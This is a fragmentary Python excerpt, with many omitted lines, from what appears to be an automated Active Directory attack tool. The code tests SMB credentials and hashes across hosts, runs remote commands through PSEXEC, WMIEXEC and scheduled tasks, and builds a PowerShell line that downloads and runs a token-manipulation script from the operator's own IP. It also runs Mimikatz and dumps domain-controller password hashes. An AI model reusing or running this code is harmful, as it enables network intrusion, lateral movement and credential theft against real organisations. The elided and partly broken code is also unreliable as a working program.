...
def testAdminAccess(tmphostno, tmpdomain, tmpusername, tmppassword, tmppasswordHash):
    ...
    results = runPSEXEC(tmphostno, tmpdomain, tmpusername,
...
def testDomainCredentials(username, password, passwordHash, ip, domain):
    ...
    if [str(ip), str(domain).lower(), str(username), str(password)] in attemptedCredList:
        print(setColor("[-]", bold, color="red"))+" "+ip+":445 " + \
            getNetBiosName(ip)+" | "+domain+"\\" + \
            username+":"+password+" [FAILED]"
        return False, foundAdmin
    else:
        if password != None:
            attemptedCredList.append(
                [str(ip), str(domain).lower(), str(username), str(password)])
        else:
            attemptedCredList.append(
                [str(ip), str(domain).lower(), str(username), str(passwordHash)])
        if passwordHash != None:
            ...
            if testAdminAccess(ip, domain, username, password, passwordHash) == True:
                ...
                if domain == '':
                    domain = "WORKGROUP"
                print(setColor("[+]", bold, color="green"))+" "+ip+":445 "+getNetBiosName(
                    ip)+" | "+domain+"\\"+username+":"+passwordHash+" [OK][ADMIN]"
                return True, foundAdmin
            else:
                if len(domain.strip()) < 1:
                    domain = "WORKGROUP"
                print(setColor("[-]", bold, color="red"))+" "+ip+":445 "+getNetBiosName(
                    ip)+" | "+domain+"\\"+username+":"+passwordHash+" [FAILED]"
                return False, foundAdmin
        else:
            try:
                ...
                if "SUCCESS" in str(resultList):
                    if testAdminAccess(ip, domain, username, password, passwordHash) == True:
                        print(setColor("[+]", bold, color="green"))+" "+ip+":445 "+getNetBiosName(
                            ip)+" | "+domain+"\\"+username+":"+password+" [OK][ADMIN]"
                        foundAdmin = True
                        tmpfound = False
                        ...
                        print(setColor("[+]", bold, color="green"))+" "+ip+":445 "+getNetBiosName(
                            ip)+" | "+domain+"\\"+username+":"+password+" [OK]"
                    ...
                    print(setColor("[-]", bold, color="red"))+" "+ip+":445 "+getNetBiosName(
                        ip)+" | "+domain+"\\"+username+":"+password+" [FAILED]"
                    return False, foundAdmin
            except Exception as e:
                print(setColor("[-]", bold, color="red"))+" "+ip+":445 "+getNetBiosName(
                    ip)+" | "+domain+"\\"+username+":"+password+" [FAILED]"
        ...
        if password == None:
            ...
            if password != None:
                if [targetIP, domain, username, password] not in accessAdmHostList:
                    accessAdmHostList.append(
                        [ip, str(domain), str(username), str(password)])
        else:
            if len(domain) < 1:
                domain = "WORKGROUP"
            if password != None:
...
def tokensPriv(targetIP, domain, username, password, passwordHash):
    ...
    if len(tmpTokenList) > 0:
        print(setColor("[+]", bold, color="green")) + \
            " List of Tokens on host: "+targetIP
                ...
                if tmpUsername.lower() in domainAdminList and tmpDomain in dcDomainNameList:
                    ...
                    if tmpUACMode == False:
                        ...
                        s = 'IEX (New-Object Net.WebClient).DownloadString(\'http://'+myIP+':8000/Invoke-TokenManipulation.ps1\');Invoke-TokenManipulation -CreateProcess "'+powershellPath+'" -Username '+foundUser + \
                            ...
                            dcNetbiosName+' | Out-File C:\\windows\\temp\\'+mimikatzOutputFilename+'.txt"'''
                        ...
                        uploadFile(tmpFilename, tmpFilename, targetIP,
                                   domain, username, password, passwordHash)

                        command = 'schtasks.exe /Delete /TN '+tmpSchedName+' /f'
                        results = runWMIEXEC(
                            targetIP, domain, username, password, passwordHash, command)
                        command = 'schtasks.exe /Create /RL HIGHEST /RU '+domain+'\\'+username+' /TN ' + \
                            tmpSchedName+' /SC MONTHLY /M DEC /TR "'"C:\\windows\\temp\\"+tmpFilename
                        results = runPSEXEC(
                            targetIP, domain, username, password, passwordHash, command)
                        ...
                        while waitForPSComplete == False:
                            ...
                            tmpFilename = downloadFile(
                                targetIP, domain, username, password, filePath)
                                    ...
                                    if len(tmpPasswordList) > 0:
                                        ...
                                        for y in tmpPasswordList:
                                            ...
                                            tmpLoginOK, tmpAdminOK = testDomainCredentials(
                                                tmpusername, tmppassword, passwordHash, dcList[0], tmpdomain)
                                            if tmpAdminOK == True:
                                                ...
                                                tmpHashList = dumpDCHashes(
                                                    dcList[0], tmpdomain, tmpusername, tmppassword)
                                                if len(tmpHashList) > 0:
                                                    addHashes(tmpHashList)
                                                    analyzeHashes(tmpHashList)
                                                    dcCompromised = True
    ...
    try:
        ...
        if len(tmpPasswordList) > 0:
            ...
            for y in tmpPasswordList:
                ...
                tmpLoginOK, tmpAdminOK = testDomainCredentials(
                    tmpusername, tmppassword, tmppasswordHash, dcList[0], tmpdomain)
                if tmpAdminOK == True:
                    if y not in daPassList:
                        daPassList.append(y)
            ...
            if len(tmpPassList) > 0 or len(tmpHashList) > 0:
                ...
                for x in tmpPassList:
                    ...
                    if dcCompromised == False:
                        ...
                        tmpHashList = dumpDCHashes(
                            dcList[0], domain, tmpusername, tmppassword)
                        addHashes(tmpHashList)
                        if len(tmpHashList) > 0:
                            addHashes(tmpHashList)
            ...
            if len(userPassList) > 0:
                for x in userPassList:
                    if y in uncompromisedHostList:
                        ...
                        if len(tmppassword) > 0 and tmppassword != '(null)':
                            tmpLoginOK, tmpAdminOK = testDomainCredentials(
                                tmpusername, tmppassword, None, tmpip, tmpdomain)
                            if tmpLoginOK == True:
                                if [domain, username, password] not in userPassList:
                                    userPassList.append(
                            ...
                            if tmpAdminOK == True:
                                tmpPasswordList = runMimikatz(
                                    tmpip, tmpdomain, tmpusername, tmppassword, tmphash)
                                for z in tmpPasswordList:
                                    if z not in userPassList:
                                        userPassList.append(z)
                                print(
            ...
            if len(userHashList) > 0:
                for x in userHashList:
                    if y in uncompromisedHostList:
                        ...
                        tmppassword = None
                        tmpLoginOK, tmpAdminOK = testDomainCredentials(
                            tmpusername, tmppassword, tmppasswordHash, tmpip, tmpdomain)
                        if tmpLoginOK == True:
                            if [domain, username, password] not in userPassList:
                                userPassList.append(
                                    [domain, username, password])
    ...
    if len(accessAdmHostList) > 0:
        ...
        for x in accessAdmHostList:
            ...
            if ip in selectedHostList:
                ...
                results = runWMIEXEC(ip, domain, username,
                                     password, passwordHash, command)
    ...
    if len(accessAdmHostList) > 0:
        ...
        for x in accessAdmHostList:
            ...
            if len(x[3]) == 65 and x[3].count(":") == 1:
                ...
                tmppassword = x[3]
                tmppasswordHash = None
            usersLoggedIntoHostList = listUsers(
                tmpip, domain, tmpusername, tmppassword, tmppasswordHash)
...
for x in accessAdmHostList:
    ...
    if len(tmppasswordHash) < 1:
        tmpAppList = getInstalledPrograms(
            tmphostno, tmpdomain, tmpusername, tmppassword, tmppasswordHash)
        for y in tmpAppList:
            if y not in tmpResultList:
                tmpResultList.append(y)
if len(tmpResultList) > 0:
